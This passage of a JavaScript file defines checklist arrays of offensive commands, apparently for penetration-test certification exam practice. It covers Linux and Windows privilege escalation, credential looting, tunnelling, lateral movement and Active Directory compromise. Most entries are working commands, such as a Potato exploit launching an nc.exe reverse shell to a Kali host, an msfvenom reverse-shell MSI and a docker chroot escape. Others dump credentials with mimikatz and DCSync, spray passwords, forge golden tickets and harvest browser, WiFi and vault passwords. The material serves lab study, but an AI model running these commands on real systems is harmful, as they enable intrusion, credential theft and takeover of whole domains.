  { id: "lp14", text: "In docker/lxd group? Container escape to mount host filesystem", cmd: "id && docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
  { id: "lp15", text: "Cron uses tar * or wildcards? Wildcard injection", cmd: "echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'" },
  { id: "lp16", text: "Python library hijack — find writable modules imported by crons/services", cmd: "find /usr/lib/python* -writable -type f 2>/dev/null" },
  { id: "lp17", text: "Find world-writable files — /etc/passwd, systemd services, PATH dirs", cmd: "find / -writable -type f 2>/dev/null | grep -v proc" },
  { id: "lp18", text: "Writable /etc/passwd? Add root user directly", cmd: "openssl passwd -1 hacker" },
  { id: "lp19", text: "Check for internal-only services to port forward", cmd: "ss -tlnp" },
  { id: "lp20", text: "DB creds in configs? Connect, dump users, crack, try SSH" },
  // — TIER 4: LOWER FREQUENCY BUT STILL SEEN —
  { id: "lp21", text: "NFS no_root_squash? Write SUID shell from Kali as root" },
  { id: "lp22", text: "Check kernel version for exploits (DirtyPipe, PwnKit, OverlayFS)", cmd: "uname -a && cat /etc/os-release" },
  { id: "lp23", text: "sudo borg? Extract backups for creds", cmd: "sudo borg list /opt/borgbackup && sudo borg extract /opt/borgbackup::ARCHIVE --stdout" },
  { id: "lp24", text: "sudo doas? Instant root", cmd: "doas -u root su" },
  { id: "lp25", text: "Run linpeas if manual checks empty after 20 min", cmd: "./linpeas.sh" },
  { id: "lp26", text: "Run linux-exploit-suggester as last resort", cmd: "./linux-exploit-suggester.sh" },
];

const PRIVESC_WINDOWS = [
  // — TIER 1: CHECK FIRST (30 sec each, highest hit rate) —
  { id: "wp1", text: "Check token privileges — SeImpersonate = instant SYSTEM", cmd: "whoami /priv" },
  { id: "wp2", text: "SeImpersonate? Try all potatoes until one works", cmd: "GodPotato-NET4.exe -cmd 'cmd /c C:\\temp\\nc.exe KALI 443 -e cmd.exe'" },
  { id: "wp3", text: "PrintSpoofer alternative for SeImpersonate", cmd: "PrintSpoofer64.exe -i -c cmd" },
  { id: "wp4", text: "SigmaPotato alternative for SeImpersonate", cmd: "SigmaPotato.exe --revshell KALI 443" },
  { id: "wp5", text: "PowerShell history ALL users — cleartext creds extremely common", cmd: "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"`n=== $_ ===\"; Get-Content $_ }" },
  { id: "wp6", text: "Check group memberships — Admin? Backup Ops? Server Ops? DnsAdmins?", cmd: "whoami /groups && net localgroup administrators" },
  { id: "wp7", text: "SeBackupPrivilege? Copy SAM/SYSTEM or ntds.dit", cmd: "reg save hklm\\sam C:\\temp\\SAM && reg save hklm\\system C:\\temp\\SYSTEM" },
  { id: "wp8", text: "SeRestorePrivilege? Replace a service binary with reverse shell" },
  { id: "wp9", text: "Stored credentials? Use runas /savecred for instant admin", cmd: "cmdkey /list" },
  { id: "wp10", text: "Check AutoLogon registry for plaintext passwords", cmd: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultPassword\"" },
  // — TIER 2: CREDENTIAL FILES & CONFIG HUNTING —
  { id: "wp11", text: "Check Unattend.xml for setup passwords (base64 or cleartext)", cmd: "type C:\\Windows\\Panther\\Unattend.xml 2>nul & type C:\\Windows\\System32\\Sysprep\\Unattend.xml 2>nul" },
  { id: "wp12", text: "Check C:\\ for unusual folders and custom executables", cmd: "dir C:\\ && dir /s /b C:\\*.exe 2>nul | findstr /v Windows" },
  { id: "wp13", text: "Check scheduled tasks for writable scripts", cmd: "schtasks /query /fo LIST /v" },
  { id: "wp14", text: "Check icacls on scheduled task scripts", cmd: "icacls C:\\path\\to\\task.bat" },
  { id: "wp15", text: "Check web.config and app configs for credentials", cmd: "type C:\\inetpub\\wwwroot\\web.config 2>nul" },
  { id: "wp16", text: "PowerShell transcripts — may reveal commands with creds", cmd: "dir /s /b C:\\*.txt 2>nul | findstr -i \"transcript output\"" },
  { id: "wp17", text: "KeePass database? Convert and crack", cmd: "dir /s /b C:\\*.kdbx 2>nul" },
  { id: "wp18", text: "UAC enabled? If disabled, any local admin = instant SYSTEM", cmd: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA" },
  // — TIER 3: SERVICE-BASED PRIVESC —
  { id: "wp19", text: "AlwaysInstallElevated? Check both keys — if both 0x1, create MSI", cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul" },
  { id: "wp20", text: "Generate malicious MSI for AlwaysInstallElevated", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f msi -o evil.msi" },
  { id: "wp21", text: "Find unquoted service paths", cmd: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"" },
  { id: "wp22", text: "Check for writable service binaries", cmd: "accesschk.exe /accepteula -uwcqv \"Everyone\" * 2>nul" },
  { id: "wp23", text: "Modify service binary path if you have permissions", cmd: "sc config VulnService binpath= \"C:\\temp\\rev.exe\" && sc stop VulnService && sc start VulnService" },
  { id: "wp24a", text: "DLL HIJACK ENUM: Find auto-start services with non-system paths (potential DLL hijack targets)", cmd: "wmic service get name,pathname,startmode | findstr /v /i \"C:\\Windows\" | findstr /i \"auto\"" },
  { id: "wp24b", text: "DLL HIJACK ENUM: Check if YOUR user can write to any of those service directories — look for (M), (W), or (F) in output", cmd: "for /f \"tokens=2 delims='='\" %a in ('wmic service get pathname /format:list ^| findstr /v /i \"C:\\Windows\" ^| findstr /i \":\\\\\"') do @icacls \"%~dpa\" 2>nul | findstr /i \"(M) (W) (F) Everyone Users BUILTIN\"" },
  { id: "wp24c", text: "DLL HIJACK ENUM: PowerUp.ps1 automated scan — finds writable service dirs + missing DLLs in one shot", cmd: "powershell -ep bypass -c \". .\\PowerUp.ps1; Find-ProcessDLLHijack; Find-PathDLLHijack\"" },
  { id: "wp24d", text: "DLL HIJACK INDICATORS: Writable service dir + non-system path = likely vulnerable. NOTE: Exploitation requires compiling a malicious DLL — see DLLHijacking.md for full walkthrough (cross-compile from Kali, no Windows machine needed)" },
  { id: "wp25", text: "icacls on ALL exe in non-standard paths — MODIFY = replace with rev shell", cmd: "icacls C:\\path\\to\\service.exe" },
  // — TIER 4: APPLICATION CREDENTIAL STORES —
  { id: "wp26", text: "FileZilla saved connections with creds", cmd: "type C:\\Users\\*\\AppData\\Roaming\\FileZilla\\recentservers.xml 2>nul" },
  { id: "wp27", text: "Firefox saved passwords — look for logins.json + key4.db", cmd: "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\logins.json 2>nul" },
  { id: "wp28", text: "Chrome Login Data — needs SharpChrome or DPAPI to decrypt", cmd: "dir /s /b \"C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" 2>nul" },
  { id: "wp29", text: "mRemoteNG saved connections — confCons.xml has encrypted creds", cmd: "dir /s /b C:\\Users\\*\\AppData\\Roaming\\mRemoteNG\\confCons.xml 2>nul" },
  { id: "wp30", text: "PuTTY saved sessions in registry (may have proxy passwords)", cmd: "reg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions /s 2>nul" },
  { id: "wp31", text: "WinSCP saved sessions in registry", cmd: "reg query HKCU\\SOFTWARE\\\"Martin Prikryl\"\\\"WinSCP 2\"\\Sessions /s 2>nul" },
  { id: "wp32", text: "VNC password from registry — decrypt on Kali with vncpwd", cmd: "reg query HKLM\\SOFTWARE\\RealVNC\\vncserver /v Password 2>nul && reg query HKLM\\SOFTWARE\\TightVNC\\Server /v Password 2>nul" },
  { id: "wp33", text: "TeamViewer password from registry", cmd: "reg query HKLM\\SOFTWARE\\TeamViewer /v Password 2>nul && reg query HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer /v Password 2>nul" },
  { id: "wp34", text: "SSH keys on Windows — check all user .ssh dirs", cmd: "dir /s /b C:\\Users\\*\\.ssh\\id_rsa C:\\Users\\*\\.ssh\\id_ed25519 2>nul" },
  { id: "wp35", text: "High-value files — PFX, PEM, PPK, PST, Access DB", cmd: "dir /s /b C:\\*.pfx C:\\*.p12 C:\\*.pem C:\\*.key C:\\*.ppk C:\\*.pst C:\\*.mdb C:\\*.accdb 2>nul" },
  { id: "wp36", text: "Credential Manager vaults — decrypt with mimikatz dpapi::cred", cmd: "dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul" },
  { id: "wp37", text: "RDP connection files — may store saved credentials", cmd: "dir /s /b C:\\Users\\*\\*.rdp C:\\Users\\*\\*.rdg 2>nul" },
  { id: "wp38", text: "RDP history in registry — shows which hosts user connects to", cmd: "reg query \"HKCU\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers\" /s 2>nul" },
  { id: "wp39", text: "Jenkins creds — need credentials.xml + master.key + hudson.util.Secret", cmd: "dir /s /b C:\\*credentials.xml 2>nul | findstr -i jenkins" },
  { id: "wp40", text: "PRTG config — contains cleartext DB password", cmd: "type \"C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.dat\" 2>nul | findstr -i password" },
  { id: "wp41", text: "NSClient++ config — may have web admin password", cmd: "type \"C:\\Program Files\\NSClient++\\nsclient.ini\" 2>nul" },
  { id: "wp42", text: "Git repos on the box — check commit history for passwords", cmd: "dir /s /b C:\\.git 2>nul" },
  { id: "wp43", text: "Scripts with creds — search all .ps1/.bat/.cmd for passwords", cmd: "findstr /si /m \"password\\|credential\\|secret\" C:\\*.ps1 C:\\*.bat C:\\*.cmd C:\\*.vbs 2>nul | findstr /v Windows" },
  // — TIER 5: BROAD SWEEPS & FALLBACKS —
  { id: "wp44", text: "Check for internal-only services to port forward", cmd: "netstat -ano | findstr LISTENING" },
  { id: "wp45", text: "RunasCs.exe to switch user without RDP when you find new creds", cmd: "RunasCs.exe user password cmd.exe" },
  { id: "wp46", text: "Search for interesting files recursively", cmd: "dir /s /b C:\\Users\\*.txt C:\\Users\\*.kdbx C:\\Users\\*.ini C:\\Users\\*.cfg C:\\Users\\*.xml 2>nul" },
  { id: "wp47", text: "Grep for passwords in files", cmd: "findstr /si \"password\" C:\\Users\\*.txt C:\\Users\\*.ini C:\\Users\\*.cfg C:\\Users\\*.xml C:\\Users\\*.config 2>nul" },
  { id: "wp48", text: "User Desktop/Documents deep dive — read all small text/config files per user", cmd: "for /d %u in (C:\\Users\\*) do @(echo === %u === && dir /s /b \"%u\\Desktop\\*.txt\" \"%u\\Desktop\\*.bat\" \"%u\\Desktop\\*.ps1\" \"%u\\Documents\\*.txt\" \"%u\\Documents\\*.xml\" 2>nul)" },
  { id: "wp49", text: "Custom .exe on box? Run it — may reveal hashes/creds" },
  { id: "wp50", text: "Simple Sticky Notes / Notes.db in user folders for cleartext creds" },
  { id: "wp51", text: "windows.old directory? SAM+SYSTEM inside for offline cracking", cmd: "dir C:\\windows.old\\Windows\\System32\\config\\ 2>nul" },
  { id: "wp52", text: "WiFi saved passwords — cleartext in profiles", cmd: "for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile name=%a key=clear 2>nul | findstr \"Key Content\"" },
  { id: "wp53", text: "Use port 80/443 for reverse shells to bypass egress firewall" },
  { id: "wp54", text: "Run automated tools if stuck after 20 min", cmd: ".\\winPEASx64.exe" },
  { id: "wp55", text: "PowerUp.ps1 for automated service/path checks", cmd: "powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"" },
];

const PROOF_LINUX = [
  { id: "pfl1", text: "Screenshot local.txt with whoami + hostname + IP", cmd: "cat /home/*/local.txt && whoami && hostname && ip addr show" },
  { id: "pfl2", text: "Screenshot proof.txt with whoami + hostname + IP", cmd: "cat /root/proof.txt && whoami && hostname && ip addr show" },
  { id: "pfl3", text: "Document attack path: foothold vuln → privesc technique → commands used" },
];

const PROOF_WINDOWS = [
  { id: "pfw1", text: "Screenshot local.txt with whoami + hostname + IP", cmd: "type C:\\Users\\user\\Desktop\\local.txt & whoami & hostname & ipconfig" },
  { id: "pfw2", text: "Screenshot proof.txt with whoami + hostname + IP", cmd: "type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & hostname & ipconfig" },
  { id: "pfw3", text: "Document attack path: foothold vuln → privesc technique → commands used" },
];

const AD_LOOT = [
  // — TIER 1: DUMP CREDS IMMEDIATELY (do this first on every admin box) —
  { id: "al1", text: "Run LootGrab.ps1 — automated credential sweep", cmd: ".\\LootGrab.ps1" },
  { id: "al2", text: "Dump SAM/LSA/LSASS remotely with nxc", cmd: "nxc smb $IP -u admin -p pass --sam --lsa --lsass --local-auth" },
  { id: "al3", text: "Dump LSA secrets — cleartext passwords live here!", cmd: "nxc smb $IP -u admin -p pass --lsa --local-auth" },
  { id: "al4", text: "Dump creds locally with mimikatz", cmd: "mimikatz.exe \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"lsadump::secrets\" exit" },
  { id: "al5", text: "Export SAM+SYSTEM from registry for offline cracking", cmd: "reg save hklm\\sam C:\\temp\\SAM && reg save hklm\\system C:\\temp\\SYSTEM" },
  // — TIER 2: HIGH-VALUE FILE CHECKS —
  { id: "al6", text: "Check PowerShell history ALL users", cmd: "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"`n=== $_ ===\"; Get-Content $_ }" },
  { id: "al7", text: "PS transcript policy check + known transcript directories", cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription 2>nul && dir C:\\Transcripts 2>nul && dir C:\\PSTranscripts 2>nul" },
  { id: "al8", text: "Check C:\\ for non-standard dirs (Tasks, Scripts, Automation, Backup)", cmd: "dir C:\\" },
  { id: "al9", text: "Check Unattend.xml, AutoLogon, web.config, app configs", cmd: "type C:\\Windows\\Panther\\Unattend.xml 2>nul" },
  { id: "al10", text: "KeePass database? Convert and crack", cmd: "dir /s /b C:\\*.kdbx 2>nul" },
  { id: "al11", text: "Run any custom .exe on the box — may dump hashes" },
  { id: "al12", text: "Search for .log files with hashes or creds", cmd: "dir /s /b C:\\*.log 2>nul | findstr -v Windows" },
  { id: "al13", text: "Check Simple Sticky Notes / Notes.db for cleartext creds", cmd: "dir /s /b C:\\*Notes.db C:\\*Sticky* 2>nul" },
  { id: "al14", text: "Check windows.old for backup SAM+SYSTEM", cmd: "dir C:\\windows.old\\Windows\\System32\\config\\ 2>nul" },
  // — TIER 3: APPLICATION CREDENTIAL STORES —
  { id: "al15", text: "Firefox logins.json + key4.db — transfer profile folder to Kali", cmd: "dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\logins.json 2>nul" },
  { id: "al16", text: "Decrypt Firefox creds on Kali with firefox_decrypt", cmd: "python3 firefox_decrypt.py /path/to/profile/" },
  { id: "al17", text: "mRemoteNG confCons.xml — decrypt with mremoteng-decrypt on Kali", cmd: "type C:\\Users\\*\\AppData\\Roaming\\mRemoteNG\\confCons.xml 2>nul" },
  { id: "al18", text: "PuTTY + WinSCP sessions in registry", cmd: "reg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions /s 2>nul && reg query HKCU\\SOFTWARE\\\"Martin Prikryl\"\\\"WinSCP 2\"\\Sessions /s 2>nul" },
  { id: "al19", text: "VNC + TeamViewer passwords from registry", cmd: "reg query HKLM\\SOFTWARE\\RealVNC\\vncserver /v Password 2>nul && reg query HKLM\\SOFTWARE\\TeamViewer /s 2>nul" },
  { id: "al20", text: "Credential Manager vaults — extract with mimikatz dpapi::cred", cmd: "dir C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul" },
  { id: "al21", text: "Check saved browser/app creds — Firefox, Chrome, FileZilla, mRemoteNG, PuTTY" },
  { id: "al22", text: "Jenkins offline decrypt — transfer 3 files to Kali and decrypt", cmd: "python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml" },
  { id: "al23", text: "Azure AD Connect? ADSync service = domain admin creds in DB", cmd: "sc query ADSync 2>nul && echo >>> adconnectdump.py or sqlcmd -S localhost -d ADSync" },
  { id: "al24", text: "PRTG config file — cleartext admin password", cmd: "findstr -i password \"C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.dat\" 2>nul" },
  { id: "al25", text: "NSClient++ config with web password", cmd: "type \"C:\\Program Files\\NSClient++\\nsclient.ini\" 2>nul" },
  { id: "al26", text: "PFX/P12 certificates — pfx2john + crack + certipy auth", cmd: "dir /s /b C:\\*.pfx C:\\*.p12 2>nul" },
  { id: "al27", text: "SSH keys on Windows targets", cmd: "dir /s /b C:\\Users\\*\\.ssh\\id_rsa C:\\Users\\*\\.ssh\\id_ed25519 2>nul" },
  { id: "al28", text: "Scripts with hardcoded creds (.ps1, .bat, .cmd, .vbs)", cmd: "findstr /si /m \"password\" C:\\*.ps1 C:\\*.bat C:\\*.cmd C:\\*.vbs 2>nul | findstr /v Windows" },
  { id: "al29", text: "Git repos — grep commit diffs for passwords", cmd: "dir /s /b C:\\.git 2>nul" },
  { id: "al30", text: "User Desktop/Documents deep dive — read all text/config files", cmd: "for /d %u in (C:\\Users\\*) do @(for %f in (\"%u\\Desktop\\*.txt\" \"%u\\Documents\\*.txt\" \"%u\\Documents\\*.xml\") do @type \"%f\" 2>nul)" },
  { id: "al31", text: "GPP passwords in SYSVOL — gpp-decrypt the cpassword", cmd: "findstr /si cpassword \\\\$DC\\SYSVOL\\*.xml 2>nul" },
  // — TIER 4: DOMAIN ENUMERATION —
  { id: "al32", text: "NETLOGON scripts — often contain hardcoded creds", cmd: "dir \\\\$DC\\NETLOGON\\*.bat \\\\$DC\\NETLOGON\\*.ps1 \\\\$DC\\NETLOGON\\*.vbs 2>nul" },
  { id: "al33", text: "SPNs for Kerberoasting via setspn (no tools needed)", cmd: "setspn -T $DOMAIN -Q */*" },
  { id: "al34", text: "LAPS — read local admin password if you have read access", cmd: "nxc ldap $DC -u user -p pass -M laps" },
  { id: "al35", text: "ADCS — check for vulnerable certificate templates", cmd: "certutil -TCAInfo 2>nul" },
  { id: "al36", text: "SNMP community strings in registry", cmd: "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities 2>nul" },
  { id: "al37", text: "ARP table — discover other hosts on internal subnets", cmd: "arp -a" },
  { id: "al38", text: "Net shares — find accessible shared folders", cmd: "net share && net view \\\\$DC /all 2>nul" },
  { id: "al39", text: "nbtscan internal subnet for host discovery after pivoting", cmd: "nbtscan 172.16.x.0/24" },
  { id: "al40", text: "SPRAY every new credential on ALL AD machines + ALL users immediately", cmd: "nxc smb $IP1 $IP2 $DC -u 'user' -p 'pass'" },
  // — TIER 5: SPRAY & LATERAL MOVEMENT —
  { id: "al41", text: "Spray with user list and password list", cmd: "nxc smb $IP -u users.txt -p 'found_password' --continue-on-success" },
  { id: "al42", text: "Password reuse: spray ALL passwords × ALL users in both directions", cmd: "nxc smb $IP -u users.txt -p passwords.txt --continue-on-success --no-bruteforce" },
  { id: "al43", text: "Search for PS transcripts and suspicious text files", cmd: "dir /s /b C:\\*.txt 2>nul | findstr -i \"transcript output\"" },
  { id: "al44", text: "RunasCs to switch user if new creds found but no WinRM/RDP", cmd: "RunasCs.exe newuser password cmd.exe" },
];
const AD_MS01_CONNECT = [
  { id: "mc1", text: "Validate provided creds work on SMB", cmd: "nxc smb $IP -u user -p pass" },
  { id: "mc2", text: "Check if WinRM is available", cmd: "nxc winrm $IP -u user -p pass" },
  { id: "mc3", text: "Connect via Evil-WinRM (preferred if available)", cmd: "evil-winrm -i $IP -u user -p pass" },
  { id: "mc4", text: "Connect via RDP with shared drive for tool transfer", cmd: "xfreerdp /v:$IP /u:user /p:pass /cert-ignore /dynamic-resolution /drive:shared,/home/kali/tools" },
  { id: "mc5", text: "Confirm shell and note user context", cmd: "whoami /all" },
  { id: "mc6", text: "Add hostname + domain to /etc/hosts", cmd: "echo '$IP hostname.domain.local hostname' >> /etc/hosts" },
];

const AD_MS02_CONNECT = [
  { id: "m2c1", text: "Try harvested creds via Evil-WinRM", cmd: "evil-winrm -i $IP -u user -p pass" },
  { id: "m2c2", text: "Pass-the-hash via Evil-WinRM", cmd: "evil-winrm -i $IP -u user -H NTLM_HASH" },
  { id: "m2c3", text: "PsExec with creds or hash (gives SYSTEM)", cmd: "impacket-psexec domain/user:pass@$IP" },
  { id: "m2c4", text: "WMIExec / SMBExec if psexec fails", cmd: "impacket-wmiexec domain/user:pass@$IP" },
  { id: "m2c5", text: "RDP if available through tunnel", cmd: "xfreerdp /v:$IP /u:user /p:pass /cert-ignore /dynamic-resolution" },
  { id: "m2c6", text: "Confirm shell and note user context", cmd: "whoami /all" },
];

const AD_MS01_PRIVESC = [
  { id: "mp1", text: "Check token privileges — SeImpersonate = instant SYSTEM", cmd: "whoami /priv" },
  { id: "mp2", text: "SeBackupPrivilege? Copy SAM/SYSTEM for offline dump", cmd: "reg save hklm\\sam C:\\temp\\SAM && reg save hklm\\system C:\\temp\\SYSTEM" },
  { id: "mp3", text: "Check group memberships for special groups", cmd: "whoami /groups && net localgroup administrators" },
  { id: "mp4", text: "Check running services, installed software, web apps on this box", cmd: "wmic service get name,pathname,startmode | findstr /v /i \"C:\\Windows\"" },
  { id: "mp5", text: "Try user=password on all services found (lisa:lisa pattern!)" },
  { id: "mp6", text: "Check C:\\ for Tasks, Scripts, Automation folders", cmd: "dir C:\\" },
  { id: "mp7", text: "Check scheduled tasks for writable scripts", cmd: "schtasks /query /fo LIST /v" },
  { id: "mp8", text: "Check PS history, Unattend.xml, config files, PS transcripts", cmd: "type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt 2>nul" },
  { id: "mp9", text: "AlwaysInstallElevated, unquoted paths, writable service binaries", cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul" },
  { id: "mp10a", text: "DLL HIJACK ENUM: Find services with non-system paths + check if dirs are writable by your user", cmd: "wmic service get name,pathname,startmode | findstr /v /i \"C:\\Windows\" | findstr /i \"auto\"" },
  { id: "mp10b", text: "DLL HIJACK ENUM: icacls on each service directory — need (M), (W), or (F) for your user/group", cmd: "icacls \"C:\\Program Files\\VulnApp\\\"" },
  { id: "mp10c", text: "DLL HIJACK ENUM: PowerUp automated scan for hijackable DLLs", cmd: "powershell -ep bypass -c \". .\\PowerUp.ps1; Find-ProcessDLLHijack; Find-PathDLLHijack\"" },
  { id: "mp10d", text: "DLL HIJACK: If writable service dir found — see DLLHijacking.md for full exploitation walkthrough (cross-compile from Kali, no Windows machine needed)" },
  { id: "mp11", text: "UAC status — if disabled, any local admin = SYSTEM", cmd: "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA" },
  { id: "mp12", text: "Check for internal-only services to port forward", cmd: "netstat -ano | findstr LISTENING" },
  { id: "mp13", text: "Run automated tools if stuck after 20 min", cmd: ".\\winPEASx64.exe" },
  { id: "mp14", text: "icacls on exe in non-standard paths — MODIFY = replace", cmd: "icacls C:\\path\\to\\service.exe" },
  { id: "mp15", text: "Custom .exe on box? Run it — may reveal hashes/creds" },
  { id: "mp16", text: "Simple Sticky Notes / Notes.db for cleartext creds", cmd: "dir /s /b C:\\*Notes.db C:\\*Sticky* 2>nul" },
  { id: "mp17", text: "windows.old dir? SAM+SYSTEM inside for offline cracking", cmd: "dir C:\\windows.old\\Windows\\System32\\config\\ 2>nul" },
  { id: "mp18", text: "Use port 80/443 for rev shell to bypass egress filters" },
];

const AD_MS01_PROOF = [
  { id: "mp01", text: "Screenshot proof.txt with whoami + hostname + IP", cmd: "type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & hostname & ipconfig" },
  { id: "mp02", text: "Document MS01 attack path: foothold → privesc → commands used" },
];

const AD_MS02_PROOF = [
  { id: "mp21", text: "Screenshot proof.txt with whoami + hostname + IP", cmd: "type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & hostname & ipconfig" },
  { id: "mp22", text: "Document MS02 attack path: lateral movement method → privesc → commands used" },
];

const AD_DC_PROOF = [
  { id: "mpd1", text: "Screenshot proof.txt with whoami + hostname + IP", cmd: "type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & hostname & ipconfig" },
  { id: "mpd2", text: "Document DC compromise: how you got DA/admin hash → connection method" },
  { id: "mpd3", text: "Verify ALL 3 screenshots captured — all 3 required for 40 pts" },
];

const AD_TUNNEL = [
  { id: "at1", text: "Create tunnel interface on Kali", cmd: "sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up" },
  { id: "at2", text: "Start Ligolo proxy server", cmd: "./proxy -selfcert -laddr 0.0.0.0:11601" },
  { id: "at3", text: "Upload and run agent on MS01", cmd: "agent.exe -connect KALI:11601 -ignore-cert" },
  { id: "at4", text: "In Ligolo proxy: start session and add route", cmd: "session\nstart\nsudo ip route add SUBNET/24 dev ligolo" },
  { id: "at5", text: "Add listener for reverse shells through tunnel", cmd: "listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443" },
  { id: "at6", text: "Scan MS02 + DC through tunnel", cmd: "sudo nmap -Pn -n $IP -sC -sV -p- --open" },
];

// ─── LATERAL MOVEMENT: MS01 → MS02 ─────────────────────
const AD_LATMOV_MS02 = [
  { id: "lm1", text: "Test ALL harvested creds from MS01 against MS02 SMB", cmd: "nxc smb MS02_IP -u user -p pass" },
  { id: "lm2", text: "Test WinRM access (Pwn3d! = can get shell)", cmd: "nxc winrm MS02_IP -u user -p pass" },
  { id: "lm3", text: "Pass-the-hash with every NTLM from SAM/LSASS", cmd: "nxc smb MS02_IP -u user -H NTLM_HASH" },
  { id: "lm4", text: "Connect via Evil-WinRM with password or hash", cmd: "evil-winrm -i MS02_IP -u user -p pass" },
  { id: "lm5", text: "PsExec for SYSTEM shell (requires local admin)", cmd: "impacket-psexec domain.local/user:pass@MS02_IP" },
  { id: "lm6", text: "WMIExec for stealthier user-level shell", cmd: "impacket-wmiexec domain.local/user:pass@MS02_IP" },
  { id: "lm7", text: "RDP with shared drive for tool transfer", cmd: "xfreerdp /v:MS02_IP /u:user /p:pass /cert-ignore /dynamic-resolution" },
  { id: "lm8", text: "Password spray all found passwords against MS02", cmd: "nxc smb MS02_IP -u users.txt -p passwords.txt --continue-on-success" },
  { id: "lm9", text: "User=password spray", cmd: "nxc smb MS02_IP -u users.txt -p users.txt --no-bruteforce" },
  { id: "lm10", text: "Re-run BloodHound with ALL newly owned users — new paths?" },
  { id: "lm11", text: "Kerberoast with new domain creds", cmd: "impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request" },
  { id: "lm12", text: "Check BloodHound for GenericAll/GenericWrite/WriteDACL on MS02" },
  { id: "lm13", text: "Try EVERY cred on EVERY protocol — 5 min max, don't skip this" },
];

// ─── LATERAL MOVEMENT: MS02 → DC ───────────────────────
const AD_LATMOV_DC = [
  { id: "ld1", text: "Check if you have DCSync rights", cmd: "nxc smb DC_IP -u user -p pass -M get-dcsync" },
  { id: "ld2", text: "DCSync — dump ALL domain hashes", cmd: "impacket-secretsdump domain.local/user:pass@DC_IP" },
  { id: "ld3", text: "Pass-the-hash to DC with PsExec", cmd: "impacket-psexec -hashes :NTLM_HASH domain.local/administrator@DC_IP" },
  { id: "ld4", text: "Evil-WinRM to DC with hash", cmd: "evil-winrm -i DC_IP -u administrator -H NTLM_HASH" },
  { id: "ld5", text: "ADCS: request vulnerable cert impersonating administrator", cmd: "certipy req -u user -p pass -ca CA_NAME -template TEMPLATE -upn administrator@domain.local -dc-ip DC_IP" },
  { id: "ld6", text: "RBCD: add fake computer, delegate, impersonate admin to DC" },
  { id: "ld7", text: "WriteDACL on domain: grant yourself DCSync then dump" },
  { id: "ld8", text: "GenericAll on DC: shadow creds, full password reset, or targeted kerberoast" },
  { id: "ld9", text: "ForceChangePassword on target user", cmd: "net rpc password 'targetuser' 'NewP@ss123!' -U user%pass -S DC_IP" },
  { id: "ld10", text: "Check LAPS for DC local admin password", cmd: "nxc ldap DC_IP -u user -p pass -M laps" },
  { id: "ld11", text: "Password spray ALL creds against DC", cmd: "nxc smb DC_IP -u users.txt -p passwords.txt --continue-on-success" },
  { id: "ld12", text: "Golden ticket if krbtgt hash obtained", cmd: "impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-... -domain domain.local administrator" },
  { id: "ld13", text: "SeBackupPrivilege on DC? Backup ntds.dit with diskshadow + robocopy" },
  { id: "ld14", text: "Try administrator hash from MS02 SAM/LSASS directly against DC" },
];

const AD_ENUM = [
  { id: "ae1", text: "Run BloodHound collection with domain creds", cmd: "bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all" },
  { id: "ae2", text: "BloodHound queries: Shortest Path to DA, Kerberoastable, AS-REP, DCSync rights" },
  { id: "ae3", text: "Check outbound rights for EVERY compromised user in BloodHound" },
  { id: "ae4", text: "Kerberoast all accounts with SPNs", cmd: "impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request" },
